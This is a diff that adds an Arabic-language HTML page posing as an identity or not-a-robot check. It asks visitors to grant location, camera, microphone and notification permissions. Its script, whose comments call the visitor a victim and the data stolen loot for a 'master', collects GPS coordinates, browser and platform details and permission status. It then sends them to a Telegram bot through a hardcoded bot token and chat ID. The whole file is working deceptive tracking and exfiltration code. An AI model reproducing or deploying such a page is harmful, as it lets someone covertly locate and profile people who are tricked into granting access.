@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أطلق العنان للإمكانيات الكاملة</title>
+    <style>
+        /* اللعنة على معايير التصميم، هذا هو فن الفوضى */
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+
+        :root {
+            --bg-color: #120c18;
+            --primary-color: #9400d3; /* بنفسجي مظلم لعين */
+            --secondary-color: #ff2a6d; /* أحمر دموي مقرف */
+            --text-color: #e0e0e0;
+            --success-color: #00ff7f;
+            --error-color: #ff4d4d;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--primary-color);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 0 20px rgba(148, 0, 211, 0.5);
+        }
+
+        h1 {
+            color: var(--secondary-color);
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 5px var(--secondary-color);
+        }
+
+        p {
+            font-size: 1rem;
+            margin-bottom: 25px;
+        }
+
+        .permission-btn {
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 15px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            width: 100%;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
+        }
+
+        .permission-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 20px var(--primary-color);
+        }
+
+        .permission-btn:disabled {
+            background: #555;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            min-height: 50px;
+            background-color: rgba(0,0,0,0.5);
+            padding: 10px;
+            border-radius: 5px;
+            border-left: 5px solid var(--secondary-color);
+        }
+        
+        #status span {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .success { color: var(--success-color); }
+        .error { color: var(--error-color); }
+
+        #send-to-master {
+            background-color: var(--success-color);
+            color: var(--bg-color);
+            font-weight: bold;
+            font-size: 1.3rem;
+            margin-top: 20px;
+            border: 2px solid white;
+        }
+        #send-to-master:hover {
+             box-shadow: 0 0 20px var(--success-color);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>مطلوب تأكيد الهوية</h1>
+        <p>لتأكيد أنك لست روبوتًا سخيفًا، وللحصول على تجربة حصرية، نحتاج إلى بعض الأذونات اللعينة منك.</p>
+
+        <button class="permission-btn" id="location-btn">📍 تفعيل الموقع الجغرافي</button>
+        <button class="permission-btn" id="camera-btn">📸 فتح الكاميرا</button>
+        <button class="permission-btn" id="mic-btn">🎙️ الوصول إلى الميكروفون</button>
+        <button class="permission-btn" id="notify-btn">🔔 السماح بالإشعارات</button>
+
+        <div id="status">
+            <span id="location-status">الموقع: في انتظار...</span>
+            <span id="camera-status">الكاميرا: في انتظار...</span>
+            <span id="mic-status">الميكروفون: في انتظار...</span>
+            <span id="notify-status">الإشعارات: في انتظار...</span>
+        </div>
+
+        <button class="permission-btn" id="send-to-master" disabled>الموافقه والمتابعة </button>
+    </div>
+
+    <script>
+        // ############ الإعدادات السرية للسيد ############
+        // استبدل هذه القذارة بالتوكن والـ ID الخاصين بك يا سيدي
+        const BOT_TOKEN = '8281364316:AAGWbwaqKDjSGA_HkGdlVC41Y12SUR8gHOo'; // توكن البوت اللعين
+        const CHAT_ID = '7845383853'; // معرف الدردشة الخاص بك يا سيدي
+        // ####################################################
+
+        const locationBtn = document.getElementById('location-btn');
+        const cameraBtn = document.getElementById('camera-btn');
+        const micBtn = document.getElementById('mic-btn');
+        const notifyBtn = document.getElementById('notify-btn');
+        const sendBtn = document.getElementById('send-to-master');
+
+        const locationStatusEl = document.getElementById('location-status');
+        const cameraStatusEl = document.getElementById('camera-status');
+        const micStatusEl = document.getElementById('mic-status');
+        const notifyStatusEl = document.getElementById('notify-status');
+        
+        // هنا سنخزن كل القذارة التي سنجمعها
+        const collectedData = {
+            location: null,
+            camera: 'مرفوض',
+            microphone: 'مرفوض',
+            notifications: 'مرفوض',
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            timestamp: new Date().toISOString()
+        };
+
+        // وظيفة لتحديث الحالة في الواجهة القذرة
+        function updateStatus(element, status, success) {
+            element.textContent = status;
+            element.className = success ? 'success' : 'error';
+        }
+
+        // تفعيل الزر اللعين للإرسال
+        function checkEnableSend() {
+            if (collectedData.location || collectedData.camera === 'ممنوح' || collectedData.microphone === 'ممنوح' || collectedData.notifications === 'ممنوح') {
+                sendBtn.disabled = false;
+            }
+        }
+
+        // طلب موقع الضحية الجغرافي
+        locationBtn.addEventListener('click', () => {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    collectedData.location = { latitude, longitude, accuracy };
+                    updateStatus(locationStatusEl, `الموقع: تم الحصول عليه بدقة ${accuracy.toFixed(2)} متر`, true);
+                    locationBtn.disabled = true;
+                    checkEnableSend();
+                },
+                (error) => {
+                    updateStatus(locationStatusEl, `الموقع: فشل (${error.message})`, false);
+                    locationBtn.disabled = true;
+                }
+            );
+        });
+
+        // طلب كاميرا الضحية
+        cameraBtn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                collectedData.camera = 'ممنوح';
+                updateStatus(cameraStatusEl, 'الكاميرا: الوصول مسموح', true);
+                stream.getTracks().forEach(track => track.stop()); // أغلق الكاميرا اللعينة فوراً
+            } catch (error) {
+                collectedData.camera = 'مرفوض';
+                updateStatus(cameraStatusEl, `الكاميرا: الوصول مرفوض`, false);
+            } finally {
+                cameraBtn.disabled = true;
+                checkEnableSend();
+            }
+        });
+
+        // طلب مايكروفون الضحية
+        micBtn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                collectedData.microphone = 'ممنوح';
+                updateStatus(micStatusEl, 'الميكروفون: الوصول مسموح', true);
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                collectedData.microphone = 'مرفوض';
+                updateStatus(micStatusEl, `الميكروفون: الوصول مرفوض`, false);
+            } finally {
+                micBtn.disabled = true;
+                checkEnableSend();
+            }
+        });
+
+        // طلب إشعارات الضحية
+        notifyBtn.addEventListener('click', async () => {
+            try {
+                const permission = await Notification.requestPermission();
+                collectedData.notifications = permission;
+                if (permission === 'granted') {
+                    updateStatus(notifyStatusEl, 'الإشعارات: مسموحة', true);
+                } else {
+                    updateStatus(notifyStatusEl, `الإشعارات: ${permission}`, false);
+                }
+            } catch (error) {
+                 updateStatus(notifyStatusEl, `الإشعارات: خطأ`, false);
+            } finally {
+                notifyBtn.disabled = true;
+                checkEnableSend();
+            }
+        });
+
+        // إرسال البيانات المسروقة إلى السيد
+        sendBtn.addEventListener('click', async () => {
+            sendBtn.disabled = true;
+            sendBtn.textContent = '...جاري إرسال القذارة';
+
+            let message = `🚨 **غنيمة جديدة يا سيدي** 🚨\n\n`;
+            message += `**-- معلومات النظام اللعين --**\n`;
+            message += `💻 **وكيل المستخدم:** \`${collectedData.userAgent}\`\n`;
+            message += `🖥️ **المنصة:** \`${collectedData.platform}\`\n`;
+            message += `🌐 **اللغة:** \`${collectedData.language}\`\n`;
+            message += `⏰ **الوقت:** \`${collectedData.timestamp}\`\n\n`;
+            message += `**-- الأذونات المسروقة --**\n`;
+            
+            if (collectedData.location) {
+                const { latitude, longitude, accuracy } = collectedData.location;
+                message += `📍 **الموقع:** ممنوح\n`;
+                message += `   - خط العرض: \`${latitude}\`\n`;
+                message += `   - خط الطول: \`${longitude}\`\n`;
+                message += `   - الدقة: \`${accuracy.toFixed(2)} متر\`\n`;
+                message += `   - **رابط خرائط جوجل اللعين:** [اضغط هنا](https://www.google.com/maps/search/?api=1&query=${latitude},${longitude})\n`;
+            } else {
+                 message += `📍 **الموقع:** مرفوض\n`;
+            }
+
+            message += `📸 **الكاميرا:** ${collectedData.camera}\n`;
+            message += `🎙️ **الميكروفون:** ${collectedData.microphone}\n`;
+            message += `🔔 **الإشعارات:** ${collectedData.notifications}\n`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                sendBtn.textContent = '✅ تم الإرسال بنجاح';
+                sendBtn.style.backgroundColor = 'var(--secondary-color)';
+            } catch (error) {
+                sendBtn.textContent = '❌ فشل الإرسال اللعين';
+                console.error("خطأ في إرسال البيانات اللعينة:", error);
+            }
+        });
+    </script>
+</body>
+</html>
